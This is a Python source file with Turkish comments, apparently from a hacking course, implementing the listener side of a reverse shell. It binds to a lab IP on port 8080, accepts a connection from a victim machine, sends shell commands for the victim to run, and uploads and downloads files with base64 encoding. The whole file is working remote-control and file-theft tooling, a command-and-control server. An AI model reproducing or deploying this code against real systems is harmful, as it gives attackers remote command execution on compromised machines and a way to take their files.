import socket
import simplejson
import base64

class SocketListener:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # tekrardan kullanmamıza yarıyor
        my_listener.bind((ip,port))  # burada dinleyeceğimiz için buranın ip sini veriyoruz

        my_listener.listen(0)  # bununla dinliyoruz
        print("Listening")
        (self.my_connection,adress) = my_listener.accept()  # bağlantıyı kabul ediyor ve bir bağlantı bir de adres veriyor.adres bağlantının kimden geldiğini söyler
        print("Connection ok" + str(adress))  # adreste iki şey var biri windowsun ipsi diğeri ...

    def json_send(self,data):
        json_data = simplejson.dumps(data)   #büyük verileri json metodu ile aalıp atabiliyoruz
        self.my_connection.send(json_data.encode("utf-8"))

    def json_reveive(self):
        json_data_rc = ""
        while True:
            try:
                json_data_rc = json_data_rc + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data_rc)
            except ValueError:
                continue

    def command_ex(self,command_input):
        self.json_send(command_input)  # komut gönderilecek ve o bilgisayarda komut çalışıp sonucunu bize gönderecek
        if command_input[0] == "exit":
            self.my_connection.close()
            exit()

        return self.json_reveive() #bu karşıdan gelen cevap


    #aşağıdaki kodla karşıdan aldığımız dosyayı resimi kendi bilgisayarımıza yazıp oluşturuyoruz
    def save_file(self,file,content):
        with open(file,"wb") as the_file:
            the_file.write(base64.b64decode(content))
            return "downloaded new file saved"

    #aşağıdaki kodda karşıdaki bilgisayara bir dosya resim falan yüklüyoruz
    def get_file_content(self,file):
        with open(file,"rb") as the_file:
            return base64.b64encode(the_file.read())

    def start_listener(self):
        while True:
            command_input = input("Enter a command:") #bir komut girilecek
            command_input = command_input.split(" ")
            try:
                #burada karşıya yükleme yapacağımız için komutu kontrol edip bir veri oluşturcaz output burada olacak yani buradan göndercez
                if command_input[0] == "upload":
                    file_content = self.get_file_content(command_input[1])
                    command_input.append(file_content)

                command_output = self.command_ex(command_input)
                #burada çıktıyı kendimize indirdiğimiz için karşıdan veriyi aldıktan sonra tuşu kontrol edip veriyi kaydedicez
                if command_input[0] == "download" and "Error!!!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)

            except Exception:
                command_output = "Error!!!"

            print(command_output)

socket_listener = SocketListener("10.0.2.26",8080)
socket_listener.start_listener()
